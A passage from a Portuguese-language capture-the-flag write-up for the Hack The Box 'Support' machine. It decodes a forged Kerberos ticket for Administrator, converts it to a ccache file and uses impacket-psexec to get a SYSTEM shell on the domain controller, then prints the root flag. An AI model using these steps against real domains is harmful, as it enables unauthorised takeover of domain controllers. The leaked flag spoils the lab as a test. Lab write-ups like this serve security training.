      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
      Gw5kYy5zdXBwb3J0Lmh0Yg==
[+] Ticket successfully imported!
```

​	Com o ticket gerado, podemos salvá-lo em um arquivo em nossa máquina, remover os espacos em branco utilizando o **sed** e fazer decode em base64.

**OBS: O ticket utilizado é o último gerado**. 

```bash
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ nano ticket64.kirbi                                                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ sed 's/^[ \t]*//' ticket64.kirbi > ticket64_1.kirbi
                                                                                                               
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ cat ticket64_1.kirbi 
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
Gw5kYy5zdXBwb3J0Lmh0Yg==

┌──(kali㉿kali)-[~/…/HTB/support]
└─$ base64 -d ticket64_1.kirbi > ticket.kirbi
```

​	Com o ticket em um arquivo, usamos o **impacket-ticketConverter** para gerar o arquivo **.ccache** , o qual exportaremos para nossa shell e usaremos para logar como **Administrator** via **impacket-psexec**. 

```bash
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ impacket-ticketConverter ticket.kirbi ticket.ccache                                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
┌──(kali㉿kali)-[~/…/HTB/support]
└─$ export KRB5CCNAME=ticket.ccache

┌──(kali㉿kali)-[~/…/HTB/support]
└─$ impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file eHmMEylO.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service AbFS on dc.support.htb.....
[*] Starting service AbFS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

​	Com a shell de **nt authority\system** podemos pegar a flag de root.

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
7d62637e9227a8f0a8914bd207bdffa4

C:\Windows\system32>
```

